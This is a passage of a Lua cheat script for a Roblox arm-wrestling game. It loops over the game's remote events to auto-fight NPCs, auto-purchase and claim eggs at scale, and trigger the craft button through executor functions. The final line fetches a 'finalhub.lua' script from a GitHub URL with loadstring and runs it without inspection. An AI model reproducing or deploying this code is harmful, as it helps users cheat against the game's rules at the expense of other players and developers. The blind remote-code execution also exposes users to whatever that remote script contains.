game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ArmWrestleService"):WaitForChild("RE"):WaitForChild("onEnterNPCTable"):FireServer(unpack(args))
        
game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ArmWrestleService"):WaitForChild("RE"):WaitForChild("onClickRequest"):FireServer() 
task.wait()
end
end)
end

function doFight24()
    spawn(function()
    while getgenv().autoFight == true do
        local args = {
            [1] = "TribeLeader",
            [2] = workspace:WaitForChild("Zones"):WaitForChild("5"):WaitForChild("Interactables"):WaitForChild("ArmWrestling"):WaitForChild("NPC"):WaitForChild("TribeLeader"),
            [3] = "5"
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ArmWrestleService"):WaitForChild("RE"):WaitForChild("onEnterNPCTable"):FireServer(unpack(args))
        
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ArmWrestleService"):WaitForChild("RE"):WaitForChild("onClickRequest"):FireServer() 
    task.wait()
    end
    end)
end

function doFight25()
    spawn(function()
    while getgenv().autoFight == true do
        local args = {
            [1] = "Mammoth",
            [2] = workspace:WaitForChild("Zones"):WaitForChild("5"):WaitForChild("Interactables"):WaitForChild("ArmWrestling"):WaitForChild("NPC"):WaitForChild("Mammoth"),
            [3] = "5"
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ArmWrestleService"):WaitForChild("RE"):WaitForChild("onEnterNPCTable"):FireServer(unpack(args))        
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ArmWrestleService"):WaitForChild("RE"):WaitForChild("onClickRequest"):FireServer() 
    task.wait()
    end
    end)
end

function doAtl7()
    spawn(function()
    while getgenv().autoFight == true do
    local args = {
    [1] = "Poseidon",
    [2] = workspace:WaitForChild("Zones"):WaitForChild("AquaEvent"):WaitForChild("Interactables"):WaitForChild("ArmWrestling"):WaitForChild("NPC"):WaitForChild("Poseidon"),
    [3] = "AquaEvent"
    }
    
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ArmWrestleService"):WaitForChild("RE"):WaitForChild("onEnterNPCTable"):FireServer(unpack(args))
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ArmWrestleService"):WaitForChild("RE"):WaitForChild("onClickRequest"):FireServer() 
    task.wait()
    end
    end)
end

function doAtl8()
    spawn(function()
    while getgenv().autoFight == true do
    local args = {
    [1] = "AtlanteanWarrior",
    [2] = workspace:WaitForChild("Zones"):WaitForChild("AquaEvent"):WaitForChild("Interactables"):WaitForChild("ArmWrestling"):WaitForChild("NPC"):WaitForChild("AtlanteanWarrior"),
    [3] = "AquaEvent"
    }
    
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ArmWrestleService"):WaitForChild("RE"):WaitForChild("onEnterNPCTable"):FireServer(unpack(args))
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ArmWrestleService"):WaitForChild("RE"):WaitForChild("onClickRequest"):FireServer() 
    task.wait()
    end
    end)
end

function doAtl9()
    spawn(function()
    while getgenv().autoFight == true do
    local args = {
    [1] = "BuffPirate",
    [2] = workspace:WaitForChild("Zones"):WaitForChild("AquaEvent"):WaitForChild("Interactables"):WaitForChild("ArmWrestling"):WaitForChild("NPC"):WaitForChild("BuffPirate"),
    [3] = "AquaEvent"
    }
    
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ArmWrestleService"):WaitForChild("RE"):WaitForChild("onEnterNPCTable"):FireServer(unpack(args))
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ArmWrestleService"):WaitForChild("RE"):WaitForChild("onClickRequest"):FireServer() 
   task.wait()
    end
    end)
end

function doAtl10()
    spawn(function()
    while getgenv().autoFight == true do
    local args = {
    [1] = "StoneGuard",
    [2] = workspace:WaitForChild("Zones"):WaitForChild("AquaEvent"):WaitForChild("Interactables"):WaitForChild("ArmWrestling"):WaitForChild("NPC"):WaitForChild("StoneGuard"),
    [3] = "AquaEvent"
    }
    
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ArmWrestleService"):WaitForChild("RE"):WaitForChild("onEnterNPCTable"):FireServer(unpack(args))
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ArmWrestleService"):WaitForChild("RE"):WaitForChild("onClickRequest"):FireServer() 
    task.wait()
    end
    end)
end

function doAtl11()
    spawn(function()
    while getgenv().autoFight == true do
    local args = {
    [1] = "ScubaDiver",
    [2] = workspace:WaitForChild("Zones"):WaitForChild("AquaEvent"):WaitForChild("Interactables"):WaitForChild("ArmWrestling"):WaitForChild("NPC"):WaitForChild("ScubaDiver"),
    [3] = "AquaEvent"
    }
    
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ArmWrestleService"):WaitForChild("RE"):WaitForChild("onEnterNPCTable"):FireServer(unpack(args))
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ArmWrestleService"):WaitForChild("RE"):WaitForChild("onClickRequest"):FireServer() 
    task.wait()
    end
    end)
end
-- EGG FUNC

function doAtl()
    spawn(function()
     while getgenv().autoEgg == true do
        local args = {
            [1] = "Crab",
            [2] = {
                ["GhostCrab"] = false,
                ["DevilCrab"] = false,
                ["WaterCrab"] = false,
                ["CitrusCrab"] = true,
                ["GlitchedCrab"] = false
            },
            [4] = false
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("EggService"):WaitForChild("RF"):WaitForChild("purchaseEgg"):InvokeServer(unpack(args))
         
     task.wait()
     end
    end)
end

function doFrost()
    spawn(function()
    while getgenv().autoEgg == true do
       local args = {
           [1] = 3
       }
       
       game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("EventService"):WaitForChild("RF"):WaitForChild("ClaimEgg"):InvokeServer(unpack(args))
       
    
   task.wait()
    end
    end)
end
   
function doCrayon()
       spawn(function()
       while getgenv().autoEgg == true do
          local args = {
              [1] = 3,
              [2] = true,
              [3] = {
                  ["CrayonElephant"] = true,
                  ["CrayonSpider"] = true,
                  ["CrayonCat"] = true
              },
          }
          
          game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("EventService"):WaitForChild("RF"):WaitForChild("ClaimEgg"):InvokeServer(unpack(args))
       
       task.wait()
       end
       end)
end

function doDino()
    spawn(function()
    while getgenv().autoEgg == true do
        local args = {
            [1] = "Gem",
            [2] = {},
            [4] = false
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("EggService"):WaitForChild("RF"):WaitForChild("purchaseEgg"):InvokeServer(unpack(args))
    
    task.wait()
    end
    end)
end

function doLimited()
    spawn(function()
    while getgenv().autoEgg == true do
        local args = {
            [1] = "Limited",
            [2] = {
                ["EvilMushroom"] = false,
                ["PinkFlamingo"] = true,
                ["SuperAngel"] = false,
                ["PurpleDragon"] = true,
                ["EvilOverseer"] = true,
                ["EvilOwl"] = false
            },
            [4] = false
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("EggService"):WaitForChild("RF"):WaitForChild("purchaseEgg"):InvokeServer(unpack(args))
        
    
    task.wait()
    end
    end)
end

function doBurning()
    spawn(function()
    while getgenv().autoEgg == true do
       local args = {
           [1] = "Burning",
           [2] = {
               ["Magnus"] = false,
               ["Dermite"] = true,
               ["Tetra"] = true,
               ["Vangaurd"] = true
           },
           [4] = false
       }
       
       game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("EggService"):WaitForChild("RF"):WaitForChild("purchaseEgg"):InvokeServer(unpack(args))
        
    task.wait()
    end
    end)
end




function doPoseidon()
    spawn(function()
    while getgenv().autoEgg == true do
       local args = {
           [1] = "Poseidon",
           [2] = {
               ["Phoenix"] = true,
               ["Thunder"] = false,
               ["Bolt"] = true
           },
           [4] = false
       }
       
       game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("EggService"):WaitForChild("RF"):WaitForChild("purchaseEgg"):InvokeServer(unpack(args))
        
    task.wait()
    end
    end)
end

function doNuclear()
    spawn(function()
    while getgenv().autoEgg == true do
       local args = {
           [1] = "Nuclear",
           [2] = {
               ["Blaze"] = true,
               ["LumoCat"] = true,
               ["Spark"] = false,
               ["LumoBoxer"] = true,
               ["LumoSheep"] = true,
               ["LumoDog"] = true
           },
           [4] = false
       }
       
       game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("EggService"):WaitForChild("RF"):WaitForChild("purchaseEgg"):InvokeServer(unpack(args))
       
    
    task.wait()
    end
    end)
end

function do8xlimited()
    spawn(function()
     while getgenv().autoEgg == true do
        local args = {
            [1] = "Limited",
            [2] = {
                ["EvilMushroom"] = false,
                ["PinkFlamingo"] = true,
                ["SuperAngel"] = false,
                ["PurpleDragon"] = true,
                ["EvilOverseer"] = true,
                ["EvilOwl"] = false
            },
            [4] = false,
            [5] = true
        }
       
        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("EggService"):WaitForChild("RF"):WaitForChild("purchaseEgg"):InvokeServer(unpack(args))
                         
     task.wait()
     end
    end)
end

function do8xfrost()
    spawn(function()
     while getgenv().autoEgg == true do
        local args = {
            [1] = 8
        }     
        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("EventService"):WaitForChild("RF"):WaitForChild("ClaimEgg"):InvokeServer(unpack(args))
                                
     task.wait()
     end
    end)
end

function do8xclawed()
    spawn(function()
     while getgenv().autoEgg == true do
        local args = {
            [1] = "Crab",
            [2] = {
                ["GhostCrab"] = false,
                ["DevilCrab"] = false,
                ["WaterCrab"] = false,
                ["CitrusCrab"] = true,
                ["GlitchedCrab"] = false
            },
            [4] = false,
            [5] = true
        }    
        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("EggService"):WaitForChild("RF"):WaitForChild("purchaseEgg"):InvokeServer(unpack(args))
                                   
     task.wait()
     end
    end)
end

function do8xnuclear()
    spawn(function()
     while getgenv().autoEgg == true do
        local args = {
            [1] = "Nuclear",
            [2] = {
                ["Blaze"] = false,
                ["LumoCat"] = true,
                ["Spark"] = false,
                ["LumoBoxer"] = true,
                ["LumoSheep"] = true,
                ["LumoDog"] = true
            },
            [4] = false,
            [5] = true
        }      
        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("EggService"):WaitForChild("RF"):WaitForChild("purchaseEgg"):InvokeServer(unpack(args))
        
                                   
     task.wait()
     end
    end)
end

function doCraft()
    spawn(function()
     while getgenv().autoCraft == true do
        local button = game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Menus.Rebirth.PetInventory.Toolbar.CraftAll

local events = {"MouseButton1Click", "MouseButton1Down", "Activated", "MouseButton1Up"}
for i,v in pairs(events) do
   for i,v in pairs(getconnections(button[v])) do
       v:Fire()
   end
end
                                        
     task.wait()
     end
    end)
end





function do8xdino()
    spawn(function()
     while getgenv().autoEgg == true do
        local args = {
            [1] = "Gem",
            [2] = {},
            [4] = false,
            [5] = true
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("EggService"):WaitForChild("RF"):WaitForChild("purchaseEgg"):InvokeServer(unpack(args))
                                        
     task.wait()
     end
    end)
end
end



loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/fallenist1/aws/main/ps/finalhub.lua"))()



